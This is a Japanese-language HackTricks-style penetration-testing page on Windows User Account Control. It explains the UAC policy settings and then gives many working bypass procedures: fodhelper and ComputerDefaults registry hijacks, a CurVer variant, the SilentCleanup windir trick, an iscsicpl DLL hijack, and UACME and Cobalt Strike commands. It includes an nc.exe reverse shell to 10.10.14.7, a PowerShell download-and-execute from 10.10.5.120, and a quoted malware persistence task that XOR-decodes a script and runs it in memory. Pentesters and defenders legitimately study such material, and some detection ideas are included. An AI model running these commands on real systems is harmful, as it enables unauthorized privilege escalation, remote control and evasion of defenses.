# UAC - ユーザー アカウント制御

{{#include ../../banners/hacktricks-training.md}}

## UAC

[ユーザー アカウント制御 (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) は、**昇格が必要な操作に対して同意を求めるプロンプト**を表示する機能です。アプリケーションには異なる `integrity` レベルがあり、**高レベル**のプログラムは、**システムを危険にさらす可能性がある**タスクを実行できます。UAC が有効な場合、管理者がアプリケーションやタスクにシステムへの管理者レベルのアクセスを明示的に許可しない限り、アプリケーションやタスクは常に**非管理者アカウントのセキュリティコンテキストで実行されます**。これは意図しない変更から管理者を守る便利な機能ですが、セキュリティ境界とは見なされません。<sup>[[2]](#references)</sup>

integrity レベルの詳細については、以下を参照してください。


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC が有効な場合、管理者ユーザーには2つのトークンが付与されます。通常の操作を medium integrity で行うための標準ユーザートークンと、管理者権限を持つトークンです。

この[ページ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)では、ログオンプロセス、ユーザーエクスペリエンス、UAC アーキテクチャを含め、UAC の仕組みについて詳しく説明しています。<sup>[[2]](#references)</sup> 管理者は、ローカルレベルで (secpol.msc を使用して) セキュリティポリシーを設定し、組織に合わせて UAC の動作を構成できます。また、Active Directory ドメイン環境では、Group Policy Objects (GPO) を通じて構成し、適用することもできます。各種設定の詳細については[こちら](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)を参照してください。UAC には、設定可能なグループポリシー設定が10個あります。以下の表に詳細を示します。

| グループポリシー設定                                                                                                                                                                                                                                                                                                                                                           | レジストリキー                | 既定の設定                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [ユーザー アカウント制御: 組み込みの Administrator アカウントに対する管理者承認モード](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (無効)                                             |
| [ユーザー アカウント制御: 管理者承認モードでの管理者向け昇格プロンプトの動作](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (セキュリティで保護されたデスクトップで、Windows 以外のバイナリに対する同意を求める) |
| [ユーザー アカウント制御: 標準ユーザー向け昇格プロンプトの動作](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (セキュリティで保護されたデスクトップで資格情報を求める)         |
| [ユーザー アカウント制御: アプリケーションのインストールを検出し、昇格を求める](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (有効。Enterprise では既定で無効)           |
| [ユーザー アカウント制御: 署名され、検証された実行ファイルのみを昇格する](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (無効)                                             |
| [ユーザー アカウント制御: 安全な場所にインストールされた UIAccess アプリケーションのみを昇格する](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (有効)                                              |
| [ユーザー アカウント制御: すべての管理者を管理者承認モードで実行する](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (有効)                                              |
| [ユーザー アカウント制御: UIAccess アプリケーションがセキュリティで保護されたデスクトップを使わずに昇格を求めることを許可する](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (無効)                                             |
| [ユーザー アカウント制御: 昇格を求めるときにセキュリティで保護されたデスクトップに切り替える](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (有効)                                              |
| [ユーザー アカウント制御: ファイルやレジストリへの書き込み失敗をユーザーごとの場所に仮想化する](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (有効)                                              |

### Windows でのソフトウェアインストールに関するポリシー

**ローカルセキュリティポリシー** (多くのシステムでは「secpol.msc」) は、既定で**管理者以外のユーザーによるソフトウェアのインストールを防止する**ように設定されています。つまり、非管理者ユーザーがソフトウェアのインストーラーをダウンロードできても、管理者アカウントがなければ実行できません。

### UAC に昇格を求めさせるレジストリキー

管理者権限のない標準ユーザーは、特定の操作を行おうとした際に、UAC が「標準」アカウントに**資格情報を求める**ように設定できます。この設定には特定の**レジストリキー**の変更が必要であり、管理者権限が必要です。ただし、**UAC bypass** がある場合や、攻撃者がすでに管理者としてログインしている場合は除きます。

ユーザーが **Administrators** グループに属している場合でも、これらの変更によって、管理操作を行う際に**アカウントの資格情報を再入力する**必要が生じます。

**実際には、昇格済みトークン、UAC bypass、またはこれらのキーを変更できる設定ミスがすでにある場合にのみ有用です。それ以外では、レジストリへの書き込み自体がブロックされます。**

変更が必要なレジストリキーとエントリは以下のとおりです (括弧内は既定値)。

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
  - `ConsentPromptBehaviorUser` = 1 (3)
  - `ConsentPromptBehaviorAdmin` = 1 (5)
  - `PromptOnSecureDesktop` = 1 (1)

これは、ローカルセキュリティポリシーツールから手動で設定することもできます。変更すると、管理操作時にユーザーは資格情報の再入力を求められます。

### 注意

**ユーザー アカウント制御はセキュリティ境界ではありません。** したがって、標準ユーザーは、ローカルの権限昇格 exploit なしに自分のアカウントから抜け出して管理者権限を得ることはできません。

### ユーザーに「コンピューターへの完全なアクセス」を求める

```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```

### UAC の特権

- Internet Explorer の Protected Mode は整合性チェックを使用し、高い整合性レベルのプロセス（Web ブラウザーなど）が、低い整合性レベルのデータ（一時インターネットファイルフォルダーなど）にアクセスするのを防ぎます。これは、ブラウザーを低整合性トークンで実行することで実現します。ブラウザーが低整合性ゾーンに保存されたデータにアクセスしようとすると、オペレーティングシステムがプロセスの整合性レベルを確認し、それに応じてアクセスを許可します。この機能は、リモートコード実行攻撃によってシステム上の機密データにアクセスされるのを防ぐのに役立ちます。
- ユーザーが Windows にログオンすると、システムはユーザーの特権の一覧を含むアクセストークンを作成します。特権は、ユーザーの権利と能力を組み合わせたものです。このトークンにはユーザーの資格情報の一覧も含まれます。これらの資格情報は、コンピューターやネットワーク上のリソースに対してユーザーを認証するために使用されます。

### Autoadminlogon

Windows の起動時に特定のユーザーが自動的にログオンするように設定するには、**`AutoAdminLogon` レジストリキー**を設定します。これは、キオスク環境やテスト目的で役立ちます。レジストリにパスワードが露出するため、安全なシステムでのみ使用してください。

レジストリエディターまたは `reg add` を使用して、次のキーを設定します。

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
  - `AutoAdminLogon` = 1
  - `DefaultUsername` = username
  - `DefaultPassword` = password

通常のログオン動作に戻すには、`AutoAdminLogon` を 0 に設定します。

## UAC bypass

> [!TIP]
> 被害者のマシンにグラフィカルにアクセスできる場合、UAC bypass は簡単です。UAC プロンプトが表示されたときに「はい」をクリックするだけです。

UAC bypass が必要となるのは、**UAC が有効で、プロセスが中整合性コンテキストで実行されており、ユーザーが Administrators グループに属している場合**です。

UAC のセキュリティレベルが最高（Always）の場合は、他のレベル（Default）の場合よりも**はるかに bypass が困難**である点に注意してください。

### 中整合性シェルからの迅速なトリアージ

bypass を試す前に、該当する状況であることを確認し、ホストのビルドを既知の有効な手法と照合してください。

```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```

実践的な注意点:
- `EnableLUA=0` の場合、bypass は不要です。任意の admin token から high integrity を直接要求できます。
- `ConsentPromptBehaviorAdmin=2` または `5` は、auto-elevate / COM-based bypasses でよく見られるシナリオです。
- `Always Notify` ではハードルが上がりますが、失敗すると決めつけず、対象のビルドで実際にテストしてください。UACME は、最近の Windows ビルドでも `AlwaysNotify compatible` な手法をいくつか追跡しています。<sup>[[3]](#references)</sup>

### UAC disabled

UAC がすでに無効（`ConsentPromptBehaviorAdmin` が **`0`**）の場合、次のような方法で admin privileges（high integrity level）を使って **reverse shell を実行できます**。

```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Local RPC + 再利用可能な debug object

AppInfo の local RPC インターフェース `201ef99a-7fa0-444c-9399-19ba84f12a1a` は、デバッグを有効にしたプロセスを作成できます。同じスレッド上でデバッグ作成されたプロセスは、そのスレッドの debug object を共有します。作成時の debug event には、RPC の結果が限定的なアクセスしか許可しない場合でも、フルアクセスのプロセスハンドルが含まれます。これにより、debug object の再利用が、Administrators グループに属する medium-integrity ユーザー向けの UAC primitive になります。<sup>[[11]](#references)[[12]](#references)</sup>

実用的な手順は次のとおりです。<sup>[[11]](#references)[[12]](#references)</sup>

1. local RPC メソッド（直接または `NdrAsyncClientCall` 経由）を呼び出し、デバッグを有効にした非昇格の使い捨てプロセスを作成する。
2. `NtQueryInformationProcess` で `ProcessDebugObjectHandle` を照会し、`NtRemoveProcessDebug` でデタッチして、そのオブジェクトを保持したまま使い捨てプロセスを終了する。
3. 同じ RPC インターフェースを使って信頼された auto-elevated プロセスを作成し、`DbgUiSetThreadDebugObject` で保存したオブジェクトを呼び出し元のスレッドに関連付ける。
4. `WaitForDebugEvent` を呼び出して `CREATE_PROCESS_DEBUG_EVENT` のプロセスハンドルを取得し、続行する前に `NtDuplicateObject` で複製する。
5. 複製したハンドルを `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` に渡し、拡張 startup-info 構造体を使って payload を起動する。これにより、昇格されたプロセスのコンテキストを再利用できると同時に、子プロセスに信頼されているように見える親プロセスとの関係を与えられます。

auto-elevated バイナリだけでなく、この短いシーケンスを探してください。local AppInfo RPC によるプロセス作成、`ProcessDebugObjectHandle` の照会、debugger のデタッチ／再アタッチ、直後の creation-debug event、ハンドルの複製、そして記録された親プロセスが作成 API を呼び出したプロセスと一致しない子プロセスが対象です。<sup>[[12]](#references)</sup>

### **非常に** Basic UAC "bypass"（ファイルシステムへのフルアクセス）

Administrators グループに属するユーザーの shell がある場合、SMB 経由で共有されている **C$ を**ローカルの新しいディスクに**マウント**できます。これにより、**ファイルシステム内のすべてにアクセス**できます（Administrator のホームフォルダーも含む）。

> [!WARNING]
> **このトリックはもう動作しないようです**

```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

### Cobalt StrikeによるUAC bypass

Cobalt Strikeの手法は、UACが最高のセキュリティレベルに設定されていない場合にのみ機能します。

```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

**Empire** と **Metasploit** にも、**UAC** を **bypass** するためのモジュールがいくつかあります。

### 昇格された COM インターフェース (`ICMLuaUtil` / `CMSTPLUA`)

自動昇格する COM オブジェクトは、現在のビルドでも実用的な UAC 攻撃対象です。`ICMLuaUtil` は現在の Windows ブランチでも動作すると UACME で追跡されており、攻撃用ツールは、対話型デスクトッププロセスや 64-bit 実行を組み合わせ、場合によっては COM Elevation Moniker の呼び出し前に PEB / プロセスの偽装を行うことで、`CMSTPLUA` への対応を続けています。<sup>[[3]](#references)</sup>

実用上のヒント:
- ユーザーの**対話型セッション**（通常は `explorer.exe` またはその子プロセス）で、**64-bit** プロセスを優先します。
- raw shell が失敗する場合、単純な `CreateProcess` ラッパーではなく、BOF / UACME 実装から再試行します。
- 子プロセスは**別の昇格プロセス**として実行されることを想定してください。多くの BOF は、現在の beacon 自体をその場で昇格させません。

### KRBUACBypass

ドキュメントとツール: [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME**](https://github.com/hfiref0x/UACME) は、UAC bypass テクニックを集めたものです。Visual Studio または MSBuild でコンパイルします。ビルドでは複数の実行ファイル（例: `Source\Akagi\output\x64\Debug\Akagi.exe`）が作成されるため、対象のビルドに適した method を選択してください。<sup>[[3]](#references)</sup>\
注意してください。一部の bypass は、ユーザーに気付かれる可能性のある可視プログラムやプロンプトを起動します。<sup>[[3]](#references)</sup>

UACME には、各テクニックが動作し始めた**ビルドバージョン**が記載されています。<sup>[[3]](#references)</sup> 使用中のバージョンに影響するテクニックを検索できます:

```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

また、[このページ](https://en.wikipedia.org/wiki/Windows_10_version_history)を使うと、ビルドバージョンから Windows のリリース `1607` がわかります。

実践的なワークフローでは、まず**ホストのビルドを評価**してから、対応する手法を実行します。

```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```

- `WinPwnage` はローカルのビルドを既知の UAC 手法とすばやく照合するため、使えなくなった PoC をすぐに除外するのに役立ちます。<sup>[[4]](#references)</sup>
- `UACME` は、バイパスを特定のビルドに対応付けるための最良の公開カタログであり続けています。バージョン 3.7.1 では手法 83～85 が追加され、その前のリリースでは既存の手法が **Windows 11 25H2** で再テストされました。古い PoC が変更なしで今も使えると決めつけず、手法の一覧とリリースノートを再確認してください。<sup>[[3]](#references)[[9]](#references)</sup>

### Always Notify 対応の WNF/UIAccess チェーン (UACME 3.7.1)

`Always Notify` でもすべての UAC バイパスを防げるわけではありません。UACME 3.7.1 では、ユーザーが制御可能な環境変数／プロトコルの状態と、昇格されたスケジュールタスクまたは UIAccess の動作を組み合わせた 3 つの新しい x64 手法を実装し、すべてに `AlwaysNotify compatible` のマークを付けています。<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** `SystemRoot` をリダイレクトし、WNF によってトリガーされる `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` に、昇格された `taskhostw.exe` から `unifiedconsent.dll` をサイドロードさせます。UACME では Windows 10 build 19041 から対応しています。
- **84 — TabTip:** 同じ環境変数のプリミティブを UIAccess の `TabTip.exe` に対して使用します。ビルドに応じて `windows.storage.dll`、`ApplicationTargetedFeatureDatabase.dll`、または `rsaenh.dll` が読み込まれ、その後、結果として得られる高整合性の UIAccess コンテキストからピボットします。UACME では Windows 8.1 / Server 2016 から対応しています。
- **85 — Narrator:** ユーザーごとの `feedback-hub` プロトコルをハイジャックし、`Alt+CapsLock+F` で Narrator を操作してから、書き込み可能な `osk.exe` のコピーを起動し、`OskSupport.dll` をサイドロードさせます。対話型デスクトップが必要で、Windows 10 1809 / Server 2019 から対応しています。

UACME のドキュメントに従ってペイロードユニットと Akagi をビルドした後、対応する手法番号を指定して実行します（省略可能なコマンドの既定値は `cmd.exe` です）。

```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```

Methods 84 と 85 は UIAccess/デスクトップとの対話に依存するため、Session 0 または非対話型のサービスシェルから、そのまま動作するとは限りません。3つとも環境/プロトコルの状態を操作して DLL を配置するため、実装を確認し、テスト後にそれらの痕跡を削除してください。<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

信頼されたバイナリ `fodhelper.exe` は、最新の Windows では自動的に昇格されます。起動時に、以下のユーザーごとのレジストリパスを `DelegateExecute` verb の検証なしで参照します。ここにコマンドを仕込むと、Medium Integrity のプロセスから（ユーザーが Administrators グループに属している場合）、UAC プロンプトなしで High Integrity のプロセスを起動できます。

fodhelper が参照するレジストリパス：
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

<details>
<summary>PowerShell の手順（payload を設定してから実行）</summary>

```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```

</details>
Notes:
- 現在のユーザーが Administrators のメンバーで、UAC レベルがデフォルトまたは緩和されている場合に動作します（追加制限のある Always Notify では動作しません）。
- 64-bit Windows 上で 32-bit プロセスから 64-bit PowerShell を起動するには、`sysnative` パスを使用します。
- Payload には任意のコマンド（PowerShell、cmd、または EXE パス）を指定できます。ステルス性を保つには、プロンプトを表示する UI を避けてください。

#### 同じ `ms-settings` handler を使う `ComputerDefaults.exe` trigger

`ComputerDefaults.exe` は、`fodhelper.exe` と同じユーザーごとの `ms-settings\Shell\Open\command` association を解決します。<sup>[[13]](#references)[[14]](#references)</sup> 上記のデフォルト command と空の `DelegateExecute` value を設定した後、代替 trigger として `Start-Process "$env:WINDIR\System32\ComputerDefaults.exe"` を使用してください。レジストリの設定を繰り返す必要はありません。<sup>[[13]](#references)[[14]](#references)</sup> 上記の `fodhelper.exe` の説明にある、medium-integrity administrator と UAC policy の前提条件は引き続き適用されます。<sup>[[2]](#references)[[3]](#references)</sup> UACME では、この trigger は Windows 10 RS4（build 17134）から掲載されているため、対象の build で確認してください。<sup>[[3]](#references)</sup>

#### CurVer/extension hijack variant（HKCU のみ）

`fodhelper.exe` を悪用する最近のサンプルは、`DelegateExecute` を使わず、ユーザーごとの `CurVer` value を介して **`ms-settings` ProgID を redirect** します。auto-elevated binary は引き続き `HKCU` の handler を解決するため、キーを作成するのに admin token は必要ありません。<sup>[[5]](#references)</sup>

```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```

昇格後、マルウェアは一般に、`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` を `0` に設定して**今後の確認プロンプトを無効化**し、その後、追加の防御回避（例: `Add-MpPreference -ExclusionPath C:\ProgramData`）を実行して、高い整合性レベルで実行されるよう永続化を再作成します。典型的な永続化タスクでは、ディスク上に**XOR暗号化されたPowerShellスクリプト**を保存し、1時間ごとにデコードしてメモリ内で実行します:<sup>[[5]](#references)</sup>

```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```

この variant も dropper をクリーンアップし、staged payloads だけを残すため、検知には **`CurVer` hijack**、`ConsentPromptBehaviorAdmin` の改ざん、Defender の除外設定の作成、またはメモリ上で PowerShell を復号する scheduled tasks の監視が必要です。<sup>[[5]](#references)</sup>

### `SilentCleanup` task による UAC bypass（`HKCU\Environment\windir`）

`SilentCleanup` は `cleanmgr.exe` を最高の権限で起動し、ユーザー環境変数から `%windir%` を展開します。`HKCU\Environment\windir` を制御できれば、その展開先を任意のコマンドにリダイレクトし、同意ダイアログなしで高い整合性レベルを取得できます。<sup>[[8]](#references)</sup> UACME ではこの technique が引き続き有効であり、最近の issue の追跡情報によれば、Windows 11 24H2 では引用符の調整だけで済む可能性があるため、最近のビルドでもこの方法を試す価値があります。<sup>[[3]](#references)</sup>

```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```

このビルドでタスクがパスを引用符で囲む場合は、末尾に引用符を付けたペイロード（例: `cmd.exe"`）で再試行してください。テスト後は必ず `HKCU\Environment\windir` をクリーンアップしてください。

#### UAC bypassをさらに行う

UIフロー、COMオブジェクト、デスクトップ操作を悪用する古典的なUAC bypassの多くは、被害者の**完全な対話型セッション**を必要とします。一般的な `nc.exe` シェルや **Session 0** で実行中のサービスでは不十分な場合がよくあります。

多くの場合、**meterpreter** セッションを使えば解決できます。**Session** の値が **1** の**プロセス**に移行してください。

![ms-settingsをカスタム拡張子（.thm）に設定し、その拡張子をペイロードに関連付ける - UAC bypassをさらに行う: meterpreterセッションを使うことで実現できます。Session...](<../../images/image (863).png>)

(_explorer.exe_ が動作するはずです)

### GUIを使ったUAC bypass

**GUIにアクセスできるなら、UACプロンプトが表示されたときに承認するだけで構いません**。技術的なbypassは実際には必要ありません。そのため、GUIセッションを取得するだけで、UACによる実際上の制約を回避できることがよくあります。

さらに、誰かが使っていたGUIセッション（RDP経由の可能性もあります）を取得できた場合、**管理者として実行されているツール**があり、UACプロンプトを再度表示させずに、そこから**管理者として**たとえば **cmd** を**実行**できることがあります。[**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif) などがその例です。こちらのほうが少し**ステルス性が高い**可能性があります。

### ノイズの多い総当たりUAC bypass

ノイズが許容される場合は、[**ForceAdmin**](https://github.com/Chainski/ForceAdmin) のようなツールで、ユーザーが承認するまで昇格を繰り返し要求できます。

### 独自のbypass - 基本的なUAC bypass手法

**UACME** を見ると、**多くのUAC bypassがDLL hijackingを悪用している**ことが分かります（多くの場合、昇格されたバイナリに、攻撃者が制御できる書き込み可能なパスからDLLをロードさせます）。[DLL hijackingの脆弱性を見つける方法はこちら](../windows-local-privilege-escalation/dll-hijacking/index.html)。

1. **自動昇格**するバイナリを見つけます（実行時に高い整合性レベルで動作することを確認してください）。
2. procmonを使って、**DLL Hijacking** の脆弱性につながる可能性がある "**NAME NOT FOUND**" イベントを見つけます。
3. 書き込み権限のない **C:\Windows\System32** のような**保護されたパス**にDLLを**書き込む**必要があるでしょう。以下の方法で回避できます。
   1. **wusa.exe**: Windows 7、8、8.1。高い整合性レベルで実行されるため、CABファイルの内容を保護されたパスに展開できます。
   2. **IFileOperation**: Windows 10。
4. DLLを保護されたパスにコピーし、脆弱性のある自動昇格バイナリを実行する**スクリプト**を用意します。

### もう1つのUAC bypass手法

**自動昇格バイナリ**が、実行する**バイナリ**または**コマンド**の**名前/パス**を**レジストリ**から**読み取ろうとするか**を監視する方法です（その情報を **HKCU** 内で検索するバイナリなら、特に興味深い手法です）。

### `SysWOW64\iscsicpl.exe` + ユーザー `PATH` によるDLL hijackでUAC bypass

32-bitの `C:\Windows\SysWOW64\iscsicpl.exe` は**自動昇格**するバイナリで、検索順序を利用して `iscsiexe.dll` をロードさせることができます。**ユーザーが書き込み可能な**フォルダーに悪意のある `iscsiexe.dll` を置き、現在のユーザーの `PATH`（たとえば `HKCU\Environment\Path`）を変更してそのフォルダーが検索されるようにすると、WindowsはUACプロンプトを表示せずに、昇格された `iscsicpl.exe` プロセス内で攻撃者のDLLをロードする可能性があります。<sup>[[1]](#references)[[6]](#references)</sup>

実践上の注意:
- 現在のユーザーが **Administrators** に属しているものの、UACによって **Medium Integrity** で実行されている場合に役立ちます。
- このbypassで対象となるのは **SysWOW64** 側のコピーです。**System32** 側のコピーは別のバイナリとして扱い、動作を個別に検証してください。
- この手法は**自動昇格**と**DLL検索順序の乗っ取り**を組み合わせたものです。そのため、他のUAC bypassと同じProcMonの手順を使って、DLLロードの欠落を検証できます。

最小限の手順:

```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```

検知のアイデア:
- `reg add` / `HKCU\Environment\Path` へのレジストリ書き込みの直後に `C:\Windows\SysWOW64\iscsicpl.exe` が実行された場合にアラートを出す。
- `%TEMP%` や `%LOCALAPPDATA%\Microsoft\WindowsApps` などの**ユーザーが制御可能な**場所にある `iscsiexe.dll` を探す。
- `iscsicpl.exe` の起動と、想定外の子プロセスや通常の Windows ディレクトリ外からの DLL 読み込みを関連付ける。

### 個別に確認する価値のある新しい研究

2024年以降に公開された一部のチェーンは、従来の `HKCU\Software\Classes` レジストリ hijack とは異なる形になっています。たとえば、activation-context cache poisoning では、**drive remap** と **DLL redirection** を組み合わせて、`ctfmon.exe` などの信頼された UI / auto-elevated バイナリや、後続の `fodhelper.exe` などのターゲットを利用し、medium integrity から high integrity へ移行できます。ここに大規模な PoC を重複して掲載する代わりに、以下の簡潔な payload 例を確認してください。

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection（プレビュー）の per-logon-session DOS device map を介したドライブレター hijack

> [!NOTE]
> 2026年8月現在、Microsoft は Administrator Protection を**Insider プレビュー**として引き続き公開しています。2025年10月の展開は撤回され、後日あらためて実施される予定です。これらのチェーンをテストする前に、**Admin Approval Mode with Administrator protection** が実際に有効になっており、デバイスが再起動済みであることを確認してください。標準の 25H2 バージョン文字列だけでは、この機能が有効であることの証明にはなりません。<sup>[[10]](#references)</sup>

Windows 11 25H2 プレビュービルドにおける `RAiLaunchAdminProcess` / UIAccess の攻撃対象領域全体については、専用ページを確認してください。

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

